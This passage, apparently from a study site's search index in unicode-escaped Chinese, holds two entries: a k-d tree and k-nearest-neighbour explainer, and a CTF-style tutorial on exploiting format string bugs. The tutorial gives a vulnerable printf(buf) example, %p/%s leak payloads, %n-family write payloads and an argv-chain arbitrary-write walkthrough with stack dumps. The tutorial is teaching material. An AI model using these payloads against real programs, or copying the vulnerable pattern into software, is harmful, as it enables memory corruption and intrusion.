\u79fb\u52d5\u5230\u7236\u7bc0\u9ede \u91cd\u8907\u57f7\u884c2,3,4,5\u6b65\u76f4\u5230\u5230\u9054\u6839\u7bc0\u9ede \u7d50\u675f\u5f8c\uff0cheap\u4e2d\u7684k\u7b46\u8cc7\u6599\u5c31\u662f\u8ddd\u96e2\u6700\u8fd1\u7684k\u7b46\u4e86 \u4e0a\u8ff0\u6240\u8aaa\u7684\u201d\u66f4\u65b0heap\u201d\u6307\u7684\u662f\u5c07\u7576\u524dheap\u4e2d\u7684\u6700\u5927\u503c\u4e1f\u6389\uff0c\u4e26\u5c07\u65b0\u7684\u503c\u653e\u5165heap\u4e2d \u5f8c\u8a18 \u53c3\u8003\u9023\u7d50 Golearn/kdtree Golearn/kdtree/heap","title":"k-d tree"},{"location":"algorithm/kdtree/#k-d-tree","text":"\u4e4b\u524d\u5728\u505a Golearn \u6642\uff0c\u70ba\u4e86\u52a0\u901f knn \u7684\u641c\u5c0b\u901f\u5ea6\uff0c\u56e0\u6b64\u5be6\u505a\u4e86 k-d tree\uff0c\u7576\u6642\u627e\u4e86\u5f88\u4e45\uff0c\u7e3d\u662f\u627e\u4e0d\u5230\u4e00\u7bc7\u5b8c\u6574\u7684\u6587\u7ae0\u8b1b\u89e3 \u5982\u4f55 \u5c07 kdtree \u61c9\u7528\u5728 knn \u4e2d \uff0c\u56e0\u6b64\u6c7a\u5b9a\u5beb\u9019\u7bc7\u4f86\u7d00\u9304\u4e0b\u6211\u7684\u4f5c\u6cd5\u3002","title":"k-d tree"},{"location":"algorithm/kdtree/#k-d-tree_1","text":"k-d tree \u662f k-dimensional tree \u7684\u7e2e\u5beb\uff0c\u4e5f\u5c31\u662f k \u7dad\u6a39\uff0c\u7c21\u55ae\u4f86\u8aaa\uff0c\u5c31\u662f\u6a39\u7684\u6bcf\u4e00\u5c64\u90fd\u662f\u4ee5 \u4e0d\u540c\u7684\u7dad\u5ea6\u6a19\u6e96 \u505a\u5206\u5272\uff0c\u800c\u4e0d\u662f\u55ae\u7d14\u7528\u67d0\u500b\u7dad\u5ea6\u4f86\u5efa\u6a39\u3002","title":"\u4ec0\u9ebc\u662f k-d tree ?"},{"location":"algorithm/kdtree/#_1","text":"\u901a\u5e38\u770b\u5230\u7684\u6a39\uff0c\u90fd\u662f\u53ea\u7528\u5176\u4e2d\u4e00\u500b\u7dad\u5ea6\u7684\u8cc7\u6599\u4f86\u5efa\u6a39\uff0c\u8209\u4f8b\u4f86\u8aaa\uff1a \u6709\u516d\u7b46\u8cc7\u6599\u5982\u4e0b\uff0c\u6bcf\u7b46\u8cc7\u6599\u90fd\u53ea\u6709\u4e00\u500b\u7dad\u5ea6 [1, 3, 5, 41, 67, 87] \u76f4\u63a5\u5efa\u6a39\u7684\u8a71\uff0c\u53ef\u80fd\u6703\u51fa\u73fe\u50cf\u9019\u6a23\u7684\u6a39","title":"\u55ae\u7dad\u5ea6\u7684\u6a39"},{"location":"algorithm/kdtree/#k-d-tree_2","text":"\u901a\u5e38\u7528\u5728\u6a5f\u5668\u5b78\u7fd2\u7684\u8cc7\u6599\u4e0d\u6703\u53ea\u6709\u4e00\u500b\u7dad\u5ea6\uff0c\u8209\u4f8b\u4f86\u8aaa\uff1a \u4e00\u6a23\u6709\u516d\u7b46\u8cc7\u6599\uff0c\u6bcf\u7b46\u8cc7\u6599\u90fd\u662f\u4e8c\u7dad\u7684 [[2, 4], [3, 7], [6, 5], [1, 6], [8, 4], [5, 3]] \u5982\u679c\u6bcf\u500b\u7dad\u5ea6\u7684\u8cc7\u6599\u90fd\u4e00\u6a23\u91cd\u8981\u7684\u8a71\uff0c\u5efa\u6a39\u6642\u5c31\u5fc5\u9808\u8003\u616e\u6240\u6709\u7684\u7dad\u5ea6\uff0c\u56e0\u6b64\u5728\u5efa k-d tree \u6642\uff0c\u5c31\u6703 \u8f2a\u6d41\u7528\u4e0d\u540c\u7684\u7dad\u5ea6 \u4f5c\u70ba\u5207\u5272\u7684\u6a19\u6e96","title":"\u591a\u7dad\u5ea6\u7684\u6a39(k-d tree)"},{"location":"algorithm/kdtree/#k-d-tree_3","text":"\u5c07\u4e0a\u9762\u7684\u8cc7\u6599\u756b\u5230\u4e8c\u7dad\u5ea7\u6a19\u5716\u4e0a\u4f86\u5206\u6790 \u5176\u4e2d\u7d05\u8272\u7684\u9ede\u662f\u4e0a\u9762\u7d66\u7684\u8cc7\u6599\uff0c\u6dfa\u85cd\u8272\u7684\u7dda\u662f\u7b2c\u4e00\u500b\u5206\u754c\uff0c\u7d2b\u8272\u7684\u7dda\u662f\u7b2c\u4e8c\u500b\u5206\u754c \u85c9\u7531 x \u65b9\u5411\u4ee5\u53ca y \u65b9\u5411\u7684\u7dda\uff0c\u5c07\u6240\u6709\u7684\u9ede\u90fd\u5340\u5206\u958b\u4f86 \u5982\u679c\u73fe\u5728\u6709\u4e00\u500b\u65b0\u7684\u9ede\uff0c\u6211\u60f3\u8981\u77e5\u9053 \u5b83\u8ddf\u8ab0\u6700\u8fd1 \u7684\u8a71\uff0c\u5c31\u53ef\u4ee5\u5229\u7528 k-d tree \u5feb\u901f\u627e\u5230\u5c6c\u65bc\u90a3\u500b\u9ede\u7684\u5340\u57df","title":"k-d tree \u5206\u6790"},{"location":"algorithm/kdtree/#k-d-tree_4","text":"","title":"\u5efa\u69cb k-d tree"},{"location":"algorithm/kdtree/#_2","text":"\u5efa\u6a39\u8981\u8003\u616e\u5169\u500b\u90e8\u4efd\uff0c\u5206\u5225\u662f \u8981\u7528\u54ea\u500b\u7dad\u5ea6\u5206\u5272 \u4ee5\u53ca \u8981\u9078\u54ea\u500b\u9ede\u7576\u5206\u5272\u7bc0\u9ede \u7dad\u5ea6\u7684\u90e8\u4efd\uff0c\u6211\u662f\u76f4\u63a5\u7167\u8457\u9806\u5e8f\u5f9e\u7b2c\u4e00\u500b\u958b\u59cb\u6bcf\u5c64\u5c31\u63db\u6210\u4e0b\u4e00\u500b\uff0c\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff0c\u5176\u5be6 \u4e0d\u4e00\u5b9a \u8981\u7167\u9806\u5e8f\u4f86\uff0c\u5012\u8457\u505a\u6216\u662f\u96a8\u6a5f\u9078\u4e00\u500b\u90fd\u662f\u53ef\u4ee5\u7684 \u9078\u64c7\u7bc0\u9ede\u7684\u90e8\u4efd\uff0c\u6211\u662f\u5c07\u7576\u524d\u5340\u584a\u7684\u6240\u6709\u9ede\u4f9d\u7167\u9078\u5b9a\u7dad\u5ea6\u7684\u503c\uff0c\u7531\u5c0f\u5230\u5927\u6392\u5217\uff0c\u63a5\u8457\u9078\u53d6 \u4e2d\u9593\u9ede \u4f5c\u70ba\u5206\u5272\u7bc0\u9ede \u5176\u9918\u7684\u82e5\u9078\u5b9a\u7dad\u5ea6\u7684\u503c\u5c0f\u65bc\u7b49\u65bc\u5206\u5272\u7bc0\u9ede\uff0c\u5247\u653e\u5165\u5de6\u5b50\u6a39 \u82e5\u5927\u65bc\u5206\u5272\u7bc0\u9ede\uff0c\u5247\u653e\u5165\u53f3\u5b50\u6a39 \u6211\u5728\u67e5 k-d tree \u76f8\u95dc\u7684\u8cc7\u6599\u6642\uff0c\u6709\u4e00\u4e9b\u8cc7\u6599\u8aaa\u8981\u628a\u6240\u6709\u7684\u9ede\u90fd\u4e0b\u653e\u5230\u8449\u7bc0\u9ede\u4e0a\uff0c\u4f46\u6211\u641e\u4e0d\u61c2\u9019\u6a23\u5982\u4f55\u5be6\u505a\uff0c\u56e0\u6b64\u9078\u64c7\u628a\u5206\u5272\u7bc0\u9ede\u639b\u5728\u4e0a\u9762\u7684\u4f5c\u6cd5","title":"\u5efa\u6a39"},{"location":"algorithm/kdtree/#_3","text":"\u5982\u679c\u73fe\u5728\u6709\u4e00\u500b\u65b0\u7684\u9ede\uff0c\u6211\u60f3\u8981\u77e5\u9053\u96e2\u5b83\u6700\u8fd1\u7684\u9ede\u6642\uff0c\u4e26\u4e0d\u662f\u76f4\u63a5\u5f80\u4e0b\u770b\u5230\u54ea\u500b\u9ede\u505c\u4e0b\u4f86\u5c31\u662f\u6700\u8fd1\u7684\uff0c\u800c\u662f\u8981 \u4e00\u5c64\u4e00\u5c64\u5c0b\u627e \uff0c\u96d6\u8aaa\u662f\u4e00\u5c64\u4e00\u5c64\u627e\uff0c\u4f46\u4e26\u4e0d\u6703\u641c\u5c0b\u6240\u6709\u7684\u9ede \u5177\u9ad4\u64cd\u4f5c\u5982\u4e0b\uff1a \u5f80\u4e0b\u6bd4\u8f03\u76f4\u5230\u627e\u5230\u6700\u5e95\u5c64\u7684\u7bc0\u9ede \u8a08\u7b97\u51fa\u7576\u524d\u9ede\u7684\u8ddd\u96e2 \u82e5\u7576\u524d\u9ede\u8ddd\u96e2\u5c0f\u65bc\u6700\u5c0f\u8ddd\u96e2\uff0c\u5247\u66f4\u65b0\u6700\u5c0f\u8ddd\u96e2\uff0c\u4e26\u641c\u5c0b\u8a72\u7bc0\u9ede\u53e6\u4e00\u5b50\u7bc0\u9ede\u4e0b\u6240\u6709\u7bc0\u9ede \u79fb\u52d5\u5230\u7236\u7bc0\u9ede \u91cd\u8907\u57f7\u884c 2, 3, 4 \u6b65\u76f4\u5230\u5230\u9054\u6839\u7bc0\u9ede","title":"\u5c0b\u627e\u6700\u8fd1\u9ede"},{"location":"algorithm/kdtree/#knn-k-d-tree","text":"\u6240\u8b02\u7684 knn \u6307\u7684\u662f k nearest neighbors\uff0c\u9867\u540d\u601d\u7fa9\uff0cknn \u5c31\u662f\u8981\u5728\u4e00\u5806\u8cc7\u6599\u4e2d\u627e\u51fa\u96e2\u67d0\u8cc7\u6599\u6700\u8fd1\u7684 k \u7b46 \u6700\u7c21\u55ae\u4e5f\u6700\u8017\u6642\u7684\u4f5c\u6cd5\u5c31\u662f\u5168\u90e8\u90fd\u8a08\u7b97\u51fa\u8ddd\u96e2\u5f8c\uff0c\u518d\u6392\u5217\u5f8c\u62ff\u51fa\u6700\u8fd1\u7684 k \u500b\uff0c\u9019\u500b\u4f5c\u6cd5\u7a31\u4f5c linear \u5be6\u969b\u4e0a\uff0c\u4e5f\u53ef\u4ee5\u5229\u7528 k-d tree \u4ee5\u5728\u4e0d\u7528\u6aa2\u67e5\u6240\u6709\u8cc7\u6599\u7684\u60c5\u6cc1\u4e0b\uff0c\u5feb\u901f\u627e\u51fa\u6700\u8fd1\u7684k\u7b46\u8cc7\u6599\uff0c\u4f46\u554f\u984c\u662f\u4e0a\u8ff0\u7684 k-d tree \u53ea\u80fd\u627e\u5230\u6700\u8fd1\u7684\u4e00\u500b\u9ede\uff0c\u56e0\u6b64\u9700\u8981\u505a\u4e00\u9ede\u4fee\u6539","title":"knn \u4f7f\u7528 k-d tree"},{"location":"algorithm/kdtree/#heap","text":"\u5728\u6211\u7684\u4f5c\u6cd5\u4e2d\u6703\u4f7f\u7528\u5230 max-heap \uff0c\u6240\u8b02\u7684 max-heap \u5c31\u662f\u6703\u5c07\u4e1f\u5165\u7684\u8cc7\u6599\u5b58\u4e0b\u4f86\uff0c\u7136\u5f8c\u53ef\u4ee5\u8f38\u51fa\u5176\u4e2d\u6700\u5927\u503c\u7684\u4e00\u7a2e\u8cc7\u6599\u7d50\u69cb","title":"heap"},{"location":"algorithm/kdtree/#k","text":"\u6211\u7684\u4f5c\u6cd5\u662f\u4f7f\u7528\u4e00\u500b\u5bb9\u91cf\u70ba k \u7684 heap\uff0c\u5728\u641c\u5c0b\u7684\u904e\u7a0b\u4e2d \u5982\u679c heap \u9084\u672a\u6eff\uff0c\u5247\u52a0\u5165\u7576\u524d\u7684\u7bc0\u9ede\uff0c\u4e14\u641c\u5c0b\u7576\u524d\u7bc0\u9ede\u7684\u53e6\u4e00\u500b\u5b50\u6a39 \u5982\u679c heap \u5df2\u6eff\uff0c\u5247\u5229\u7528 heap \u4e2d\u7684\u7576\u524d\u6700\u5927\u503c\u4f86\u57f7\u884c\u539f\u672c\u7684\u641c\u5c0b\uff0c\u4e26\u96a8\u6642\u66f4\u65b0 heap \u4e2d\u7684\u503c \u5177\u9ad4\u64cd\u4f5c\u5982\u4e0b\uff1a \u5f80\u4e0b\u6bd4\u8f03\u76f4\u5230\u627e\u5230\u6700\u5e95\u5c64\u7684\u7bc0\u9ede \u8a08\u7b97\u51fa\u7576\u524d\u9ede\u7684\u8ddd\u96e2 \u82e5heap\u672a\u6eff\uff0c\u5247\u52a0\u5165\u7576\u524d\u7bc0\u9ede\uff0c\u4e14\u641c\u5c0b\u8a72\u7bc0\u9ede\u53e6\u4e00\u5b50\u7bc0\u9ede\u4e0b\u6240\u6709\u7bc0\u9ede \u82e5heap\u5df2\u6eff\uff0c\u4e14\u7576\u524d\u9ede\u8ddd\u96e2\u5c0f\u65bcheap\u4e2d\u6700\u5927\u8ddd\u96e2\uff0c\u5247\u66f4\u65b0heap\uff0c\u4e26\u641c\u5c0b\u8a72\u7bc0\u9ede\u53e6\u4e00\u5b50\u7bc0\u9ede\u4e0b\u6240\u6709\u7bc0\u9ede \u79fb\u52d5\u5230\u7236\u7bc0\u9ede \u91cd\u8907\u57f7\u884c2,3,4,5\u6b65\u76f4\u5230\u5230\u9054\u6839\u7bc0\u9ede \u7d50\u675f\u5f8c\uff0cheap\u4e2d\u7684k\u7b46\u8cc7\u6599\u5c31\u662f\u8ddd\u96e2\u6700\u8fd1\u7684k\u7b46\u4e86 \u4e0a\u8ff0\u6240\u8aaa\u7684\u201d\u66f4\u65b0heap\u201d\u6307\u7684\u662f\u5c07\u7576\u524dheap\u4e2d\u7684\u6700\u5927\u503c\u4e1f\u6389\uff0c\u4e26\u5c07\u65b0\u7684\u503c\u653e\u5165heap\u4e2d","title":"\u524d k \u500b\u6700\u5c0f\u503c\u641c\u5c0b"},{"location":"algorithm/kdtree/#_4","text":"","title":"\u5f8c\u8a18"},{"location":"algorithm/kdtree/#_5","text":"Golearn/kdtree Golearn/kdtree/heap","title":"\u53c3\u8003\u9023\u7d50"},{"location":"pwn/format_string/","text":"Format String format string \u662f\u5728\u4f7f\u7528 printf \u4e0a\u7684\u4e00\u500b\u6f0f\u6d1e\uff0c\u57fa\u672c\u4e0a\u597d\u50cf\u53ea\u6703\u5728\u6253\u984c\u76ee\u7684\u6642\u5019\u51fa\u73fe XD \u4ee5\u4e0b\u662f\u7d93\u5178\u7684 format string \u7bc4\u4f8b char buf [ 50 ]; scanf ( \"%s\" , buf ); printf ( buf ); \u539f\u672c\u61c9\u8a72\u7531\u958b\u767c\u8005\u586b\u5beb\u7684 format \u8b8a\u6210\u4f7f\u7528\u8005\u53ef\u63a7\u7684\uff0c\u53ef\u4ee5\u85c9\u7531\u9019\u6a23\u7684\u6f0f\u6d1e\u9054\u5230\u4efb\u610f\u8b80\u53d6\u53ca\u4efb\u610f\u5beb\u5165\u7684\u64cd\u4f5c printf \u53c3\u6578 \u4e00\u958b\u59cb\u8981\u5148\u8b1b\u7684\u662f printf \u7684\u53c3\u6578\uff0c\u5728 amd64 \u7684\u60c5\u6cc1\u4e0b\uff0c\u5982\u679c\u53c3\u6578\u6c92\u6709\u8d85\u904e 6 \u500b\u7684\u8a71\u6703\u653e\u5728 register \u4e0a\uff0c\u7b2c 7 \u500b\u958b\u59cb\u624d\u653e\u5728 stack \u4e0a rdi \u2192 rsi \u2192 rdx \u2192 rcx \u2192 r8 \u2192 r9 \u2192 stack \u6b63\u5e38\u4f7f\u7528 printf \u6642\uff1a printf ( \"%d%c%s\" , a , b , c ); | | | | rdi rsi rdx rcx \u5728\u4f7f\u7528 fromat string \u6642\uff0c rdi \u662f\u81ea\u5df1\u7684 payload\uff0c\u800c\u7b2c\u4e00\u500b % \u4ee3\u8868\u7684\u662f rsi \uff0c\u5982\u679c\u60f3\u8981\u52d5\u5230 stack \u4e0a\u7684\u6771\u897f\u5c31\u8981\u5f9e\u7b2c 6 \u500b % \u958b\u59cb \u76f4\u63a5\u6307\u5b9a\u53c3\u6578 \u53ef\u4ee5\u4f7f\u7528 %x$y \u76f4\u63a5\u6307\u5b9a\u7b2c\u5e7e\u500b\u53c3\u6578\uff0c\u9019\u908a\u7684 x \u662f\u7b2c\u5e7e\u500b\u53c3\u6578\uff0c y \u5247\u662f\u8981\u4f7f\u7528\u7684\u65b9\u6cd5 % 2 $ p // \u5370\u51fa rdx (\u7b2c 2 \u500b\u53c3\u6578) % 3 $ n // \u5beb\u5165 rcx (\u7b2c 3 \u500b\u53c3\u6578) \u8b80\u53d6 \u8b80\u53d6\u7684\u90e8\u5206\u4e3b\u8981\u53ef\u4ee5\u6709 %p \u4ee5\u53ca %s \u5169\u7a2e\u505a\u6cd5\uff0c %p \u53ef\u4ee5\u7528\u4f86\u8b80\u53d6 register \u4ee5\u53ca stack \u4e0a\u7684\u503c\uff0c\u800c %s \u5247\u53ef\u4ee5\u505a\u5230\u4efb\u610f\u8b80\u53d6 %p \u5728\u8b80\u53d6\u6642\u4f7f\u7528\u7684\u662f %p \uff0c\u53ef\u4ee5\u7528 16 \u9032\u4f4d\u5370\u51fa\u67d0\u500b register (stack \u67d0\u4f4d\u7f6e) \u5b58\u7684\u503c\uff0c\u4ee5\u4e0b\u4f86\u500b\u7bc4\u4f8b \u9019\u908a\u8f38\u5165\u7684 payload \u662f %p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p \u8f38\u51fa\u5982\u4e0b 0x1,0x7ffff7dd3790,0xa,(nil),0x7ffff7fe9700,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x400070,0x7fffffffe940,0x7b74f8be5cadfe00,0x4006f0 | | | | | | | | | rsi rdx rcx r8 r9 rsp rsp + 0x8 rsp + 0x10 rsp + 0x18 \u5047\u8a2d\u60f3\u8981\u5370\u51fa rsp + 0x28 \u7684\u503c\u4e5f\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528 $ \u4f86\u6307\u5b9a %10$p -> 0x400070 %s %s \u8ddf %p \u8b80\u53d6\u7684\u76ee\u6a19\u4e0d\u4e00\u6a23\uff0c %s \u662f\u628a\u5b58\u7684\u503c\u7576\u6210\u6307\u6a19\u53bb\u8b80\u53d6\uff0c\u800c %p \u662f\u628a\u5b58\u7684\u503c\u76f4\u63a5\u9001\u51fa\u4f86 \u5728\u6b63\u5e38\u4f7f\u7528 %s \u6642\uff0c\u653e\u5165\u7684\u53c3\u6578\u662f\u67d0\u500b\u5b57\u4e32\u7684\u6307\u6a19\uff0c printf \u6703\u628a\u6307\u6a19\u6240\u6307\u7684\u5730\u65b9\u7576\u6210\u5b57\u4e32\u5370\u51fa char str [] = \"Hello World!\" ; printf ( \"%s\" , str ); // Hello World! \u9019\u7a2e\u6a5f\u5236\u5c31\u53ef\u4ee5\u7528\u4f86\u4efb\u610f\u8b80\u53d6\uff0c\u5047\u8a2d\u8f38\u5165\u7684 payload \u5728 stack \u4e0a\u7684\u8a71\uff0c\u53ef\u4ee5\u628a\u60f3\u8981\u5370\u51fa\u7684\u4f4d\u5740\u5beb\u5728 payload \u4e0a\uff0c\u63a5\u8457\u4f7f\u7528 %s \u53bb\u8b80\u51fa\u4f86\uff0c\u4ee5\u4e0b\u662f\u7bc4\u4f8b \u9019\u6642\u5019\u7684\u8f38\u5165\u5982\u4e0b\uff0c aaaa \u7684\u90e8\u5206\u662f\u70ba\u4e86\u628a\u8981\u5370\u7684\u4f4d\u5740\u63a8\u5230 rsp + 0x8 \uff0c\u9019\u6a23 rsp + 0x8 \u5c31\u6703\u525b\u597d\u662f 0x6262626262626262 (\"bbbbbbbb\") %7$saaaabbbbbbbb \u5728\u57f7\u884c printf \u6642\u6703\u53bb\u6293 0x6262626262626262 \u6240\u5b58\u7684\u503c\u4e26\u7576\u6210\u5b57\u4e32\u5370\u51fa\uff0c\u4e0d\u904e\u9019\u6b21\u7684\u7bc4\u4f8b\u6c92\u6709\u9019\u500b\u4f4d\u5740\uff0c\u6240\u4ee5\u6703\u5931\u6557 \u5beb\u5165 printf \u4f7f\u7528 %n \u6642\u53ef\u4ee5\u5beb\u5165\u6307\u5b9a\u7684\u4f4d\u7f6e\uff0c\u4e5f\u53ef\u4ee5\u66f4\u8fd1\u4e00\u6b65\u4f7f\u7528 argv chain \u4f86\u9054\u6210\u4efb\u610f\u4f4d\u5740\u5beb\u5165 %n \u8ddf %s \u985e\u4f3c\uff0c\u4e00\u6a23\u662f\u628a\u5b58\u7684\u503c\u7576\u6210\u6307\u6a19\uff0c %s \u5c07\u6307\u6a19\u6307\u7684\u4f4d\u7f6e\u8b80\u51fa\u4f86\uff0c\u800c %n \u5247\u662f\u628a\u6578\u503c\u5beb\u5165\u6307\u6a19\u6240\u6307\u7684\u4f4d\u7f6e \u5047\u8a2d stack \u4e0a\u7684 rsp + 0x10 \u5982\u4e0b\uff0c\u7528 %8$n \u5beb\u5165\u9019\u683c\u6642\uff0c\u5be6\u969b\u4e0a\u6703\u5beb\u5230 0x7ffff7fea000 0016 | 0x7fffffffdb88 --> 0x7ffff7fea000 --> 0x7ffff7a0d000 --> 0x3010102464c457f \u5982\u679c\u662f\u5beb 0xdeadbeef \u7684\u8a71\uff0c\u9019\u6bb5\u5c31\u6703\u8b8a\u6210 0016| 0x7fffffffdb88 --> 0x7ffff7fea000 --> 0x7fffdeadbeef \u5beb\u5165\u7684\u503c \u5beb\u5165\u7684\u503c\u662f\u5728\u9047\u5230 %n \u524d\u7e3d\u5171\u5370\u4e86\u5e7e\u500b\u5b57\u5143 \u4f8b\u5982 payload \u5982\u4e0b\uff0c %n \u524d\u6709 8 \u500b a \uff0c\u6240\u4ee5\u6703\u5beb 8 \u5230\u6307\u5b9a\u7684\u4f4d\u7f6e aaaaaaaa%n \u5982\u679c\u6709\u591a\u500b %n \u7684\u8a71\u5c31\u8981\u770b\u524d\u9762\u5230\u5e95\u591a\u9577 \u4f8b\u5982 payload \u5982\u4e0b\uff0c\u7b2c\u4e00\u500b %n \u524d\u6709 8 \u500b a \uff0c\u6703\u5beb 8 \u5230 rsp \u6307\u7684\u4f4d\u7f6e\uff0c\u800c\u7b2c\u4e8c\u500b %n \u524d\u6709 8 \u500b a \u4ee5\u53ca 8 \u500b b \uff0c\u5171 16 \u5b57\u5143\uff0c\u6240\u4ee5\u6703\u5beb 16 \u5230 rsp + 8 \u6240\u6307\u7684\u4f4d\u7f6e aaaaaaaa%6$nbbbbbbbb%7$n \u4e0d\u904e\u9019\u6a23\u5beb\u5165\u8981\u6253\u5f88\u4e45\uff0c\u9019\u6642\u5019\u53ef\u4ee5\u7528\u5230 %c \u4f86\u69cb\u6210 payload \u5148\u4f86\u770b\u770b %c \u7684\u7528\u6cd5\uff0c\u53ef\u4ee5\u76f4\u63a5\u6307\u5b9a\u8981\u5370\u51fa\u7684\u9577\u5ea6 // input char ch = 'a' printf ( \"%3c\" ); printf ( \"%5c\" ); // output \" a\" \" a\" \u5229\u7528 %c \u4fee\u6539\u4e00\u4e0b\u4e0a\u9762\u7684\u7bc4\u4f8b\uff0c\u53ef\u4ee5\u9054\u6210\u4e00\u6a23\u7684\u6548\u679c %8c%6$n%8c%7$n \u5beb\u5165\u7684\u9577\u5ea6 \u4e0a\u9762\u96d6\u7136\u90fd\u7528 %n \u4f86\u8209\u4f8b\uff0c\u4f46\u5176\u5be6\u5beb\u5165\u53ef\u4ee5\u6307\u5b9a\u4e0d\u540c\u7684\u9577\u5ea6 \u683c\u5f0f \u9577\u5ea6 (byte) %lln 8 bytes %n 4 bytes %hn 2 bytes %hhn 1 byte \u4ee5\u4e00\u958b\u59cb\u7684\u4f8b\u5b50\u4f86\u8aaa 0016 | 0x7fffffffdb88 --> 0x7ffff7fea000 --> 0x7ffff7a0d000 --> 0x3010102464c457f \u5beb aaaa%8$lln 0016 | 0x7fffffffdb88 --> 0x7ffff7fea000 --> 0x4 \u5beb aaaa%8$n 0016 | 0x7fffffffdb88 --> 0x7ffff7fea000 --> 0x7fff00000004 \u5beb aaaa%8$hn 0016 | 0x7fffffffdb88 --> 0x7ffff7fea000 --> 0x7ffff7a00004 \u5beb aaaa%8$hhn 0016 | 0x7fffffffdb88 --> 0x7ffff7fea000 --> 0x7ffff7a0d004 \u4e00\u822c\u5728\u4f7f\u7528\u7684\u6642\u5019\uff0c\u901a\u5e38\u4e0d\u6703\u4e00\u6b21\u5beb\u5165\u6574\u6bb5\u7684\u8cc7\u6599\uff0c\u4f8b\u5982\u8981\u5beb\u5165 0xdeadbeef \u7684\u8a71\uff0c\u5c31\u5fc5\u9808\u8981\u4e00\u6b21\u5beb 3735928559 \u500b\u5b57\u5143\uff0c\u9700\u8981\u8dd1\u8d85\u4e45\u7684\uff0c\u56e0\u6b64\u6703\u914d\u5408 argv chain \u5206\u6210 0xde \u3001 0xad \u3001 0xbe \u3001 0xef \u4f86\u591a\u6b21\u5beb\u5165 argv chain argv chain \u662f\u5229\u7528 stack \u4e0a\u7684 argv \u4f86\u9054\u6210\u4efb\u610f\u5beb\u5165\u7684\u529f\u80fd stack \u4e0a\u90fd\u6703\u6709\u4e00\u6bb5\u662f argv \u7684\u4f4d\u7f6e\uff0cargv chain \u4e0a\u7684\u5169\u6bb5\u4f4d\u5740\u90fd\u5728 stack \u4e0a\u4e14\u53ef\u4ee5\u63a7\u5236 0000 | 0x7fffffffe820 --> 0x333231 ( '123' ) 0008 | 0x7fffffffe828 --> 0x40073d ( <__libc_csu_init+77>: add rbx,0x1 ) 0016 | 0x7fffffffe830 --> 0x0 0024 | 0x7fffffffe838 --> 0x0 0032 | 0x7fffffffe840 --> 0x4006f0 ( <__libc_csu_init>: push r15 ) 0040 | 0x7fffffffe848 --> 0x400590 ( <_start>: xor ebp,ebp ) 0048 | 0x7fffffffe850 --> 0x7fffffffe940 --> 0x1 0056 | 0x7fffffffe858 --> 0xa0a688c62ba6ff00 0064 | 0x7fffffffe860 --> 0x4006f0 ( <__libc_csu_init>: push r15 ) 0072 | 0x7fffffffe868 --> 0x7ffff7a2d830 ( <__libc_start_main+240>: mov edi,eax ) 0080 | 0x7fffffffe870 --> 0x0 +--------------------------------------------------------------------------------------------------------------+ | 0088 | 0x7fffffffe878 --> 0x7fffffffe948 --> 0x7fffffffeb80 ( \"/home/frozenkp/challenge/format/a.out\" ) | +--------------------------------------------------------------------------------------------------------------+ 0096 | 0x7fffffffe880 --> 0x1f7ffcca0 0104 | 0x7fffffffe888 --> 0x400686 ( <main>: push rbp ) 0112 | 0x7fffffffe890 --> 0x0 0120 | 0x7fffffffe898 --> 0xc5142c5f7392e1ee 0088 | 0x7fffffffe878 --> 0x7fffffffe948 --> 0x7fffffffeb80 --> 0x72662f656d6f682f | | | rsp + 0x58 rsp + 0x128 rsp + 0x360 argv0 argv1 argv2 \u53ef\u4ee5\u900f\u904e\u5beb\u5165 argv1 \u4f86\u6539\u52d5 argv2 \u5beb\u7684\u5167\u5bb9 (address)\uff0c\u6700\u5f8c\u518d\u900f\u904e\u5beb\u5165 argv2 \u4f86\u5beb\u5165\u6307\u5b9a\u7684\u4f4d\u5740 \u4ee5\u4e0b\u7bc4\u4f8b\uff0c\u5047\u8a2d\u8981\u5728 0xdeadbeef \u5beb\u5165 0x4 \u7b2c\u4e00\u6b65\uff1a\u900f\u904e argv1 \u5beb 2 bytes \u4e00\u958b\u59cb\u5148\u5728 argv2 \u7684\u503c\u5beb\u4e0a 0xbeef \uff0cpayload \u5982\u4e0b %48879c%43$hn \u5beb\u5b8c\u5f8c\u5982\u4e0b +----+ 0088 | 0x7fffffffe878 --> 0x7fffffffe948 --> 0x7fffffffeb80 --> 0x72662f656d6f | beef | +----+ \u7b2c\u4e8c\u6b65\uff1a\u900f\u904e argv0 \u79fb\u52d5 2 \u628a argv2 \u79fb\u52d5 2\uff0cpayload \u5982\u4e0b %2c%17$hhn \u5beb\u5b8c\u5f8c\u5982\u4e0b\uff0cargv2 \u5f9e 0x7fffffffeb80 \u8b8a\u6210 0x7fffffffeb82 0088 | 0x7fffffffe878 --> 0x7fffffffe948 --> 0x7fffffffeb82 --> 0x7a6f72662f656d6f \u7b2c\u4e09\u6b65\uff1a\u900f\u904e argv1 \u5beb 2 bytes \u539f\u672c\u53ea\u80fd\u5beb\u4e0a 0xbeef \uff0c\u5f8c\u9762\u7684\u90e8\u5206\u900f\u904e\u7b2c\u4e8c\u6b65\u79fb\u52d5 argv2 \u4ee5\u5f8c\u5c31\u53ef\u4ee5\u7528 %hn \u78b0\u5230\u4e86 \u56e0\u70ba\u5269\u4e0b\u53ea\u8981\u5beb\u6389 0xdead \u5c31\u597d\uff0c\u6240\u4ee5\u6211\u9019\u908a\u76f4\u63a5\u4f7f\u7528 %lln \u628a\u5f8c\u9762\u90fd\u7528 0 \u84cb\u6389 %57005c%43$lln \u5beb\u5b8c\u5f8c\u5982\u4e0b +------+ 0088 | 0x7fffffffe878 --> 0x7fffffffe948 --> 0x7fffffffeb82 --> | 0xdead | +------+ \u7b2c\u56db\u6b65\uff1a\u900f\u904e argv0 \u79fb\u52d5\u56de\u4f86 \u628a argv2 \u79fb\u52d5\u56de\u4f86\uff0cpayload \u5982\u4e0b %17$hhn \u5beb\u5b8c\u5f8c\u5982\u4e0b\uff0c\u5206\u5169\u6bb5\u5beb\u5f8c\u5c31\u53ef\u4ee5\u628a\u6574\u500b 0xdeadbeef \u5beb\u4e0a\u53bb\u4e86 +----------+ 0088 | 0x7fffffffe878 --> 0x7fffffffe948 --> 0x7fffffffeb80 --> | 0xdeadbeef | +----------+ \u7b2c\u4e94\u6b65\uff1a\u900f\u904e argv2 \u5beb\u5165 0xdeadbeef 